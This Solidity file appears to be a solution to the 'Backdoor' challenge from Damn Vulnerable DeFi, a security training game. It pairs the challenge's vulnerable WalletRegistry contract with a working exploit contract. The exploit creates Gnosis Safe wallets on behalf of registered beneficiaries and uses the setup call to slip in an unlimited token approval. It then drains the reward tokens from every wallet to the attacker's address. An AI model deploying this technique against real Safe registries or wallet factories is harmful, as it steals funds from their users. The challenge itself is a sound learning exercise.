// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
 *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    error NotEnoughFunds();
    error CallerNotFactory();
    error FakeMasterCopy();
    error InvalidInitialization();
    error InvalidThreshold(uint256 threshold);
    error InvalidOwnersCount(uint256 count);
    error OwnerIsNotABeneficiary();
    error InvalidFallbackManager(address fallbackManager);

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        _initializeOwner(msg.sender);

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length;) {
            unchecked {
                beneficiaries[initialBeneficiaries[i]] = true;
                ++i;
            }
        }
    }

    function addBeneficiary(address beneficiary) external onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    /**
     * @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
     */
    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)
        external
        override
    {
        if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) { // fail early
            revert NotEnoughFunds();
        }

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        if (msg.sender != walletFactory) {
            revert CallerNotFactory();
        }

        if (singleton != masterCopy) {
            revert FakeMasterCopy();
        }

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
            revert InvalidInitialization();
        }

        // Ensure wallet initialization is the expected
        uint256 threshold = GnosisSafe(walletAddress).getThreshold();
        if (threshold != EXPECTED_THRESHOLD) {
            revert InvalidThreshold(threshold);
        }

        address[] memory owners = GnosisSafe(walletAddress).getOwners();
        if (owners.length != EXPECTED_OWNERS_COUNT) {
            revert InvalidOwnersCount(owners.length);
        }

        // Ensure the owner is a registered beneficiary
        address walletOwner;
        unchecked {
            walletOwner = owners[0];
        }
        if (!beneficiaries[walletOwner]) {
            revert OwnerIsNotABeneficiary();
        }

        address fallbackManager = _getFallbackManager(walletAddress);
        if (fallbackManager != address(0))
            revert InvalidFallbackManager(fallbackManager);

        // Remove owner as beneficiary
        beneficiaries[walletOwner] = false;

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
    }

    function _getFallbackManager(address payable wallet) private view returns (address) {
        return abi.decode(
            GnosisSafe(wallet).getStorageAt(
                uint256(keccak256("fallback_manager.handler.address")),
                0x20
            ),
            (address)
        );
    }
}



contract BackdoorExploiter{
    address public immutable masterCopy;
    address public immutable walletRegistry;
    address public immutable walletFactory;
    address[] public owners;
    address public immutable attacker;
    address public immutable DVT;
    address public immutable supporterContract;

    constructor(address _masterCopy, address _walletRegistry, address _walletFactory, address[] memory _owners,  address _DVT){
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        walletFactory = _walletFactory;
        owners = _owners;
        attacker = msg.sender;
        DVT = _DVT;
        supporterContract = address(new exploitSupport(_DVT));
        exploit();
    }

    function exploit() public {
        address[] memory wallets = new address[](owners.length);
        bytes memory moduleData = abi.encodeWithSignature(
            "approve(address)",
           address(this)
        );
        for (uint256 i = 0; i < owners.length; i++) {
            address[] memory currentOwners = new address[](1);
            currentOwners[0] = owners[i];
              bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                currentOwners,
                1,
               supporterContract,
                moduleData,
                address(0),
                address(0),
                0,
                address(0)
            );
            wallets[i] = address(GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(masterCopy,initializer,i, IProxyCreationCallback(walletRegistry)));
            IERC20(DVT).transferFrom(wallets[i], attacker, IERC20(DVT).balanceOf(wallets[i]));
            console.log("DVT balance: %s", IERC20(DVT).balanceOf(attacker));
        }
    }


    function approve(address spender) public {
        IERC20(DVT).approve(spender, type(uint256).max);
    }
}



contract exploitSupport {
    address public immutable DVT;
    constructor(address _DVT){
        DVT = _DVT;
    }
    function approve(address spender) public {
        IERC20(DVT).approve(spender, type(uint256).max);
    }
}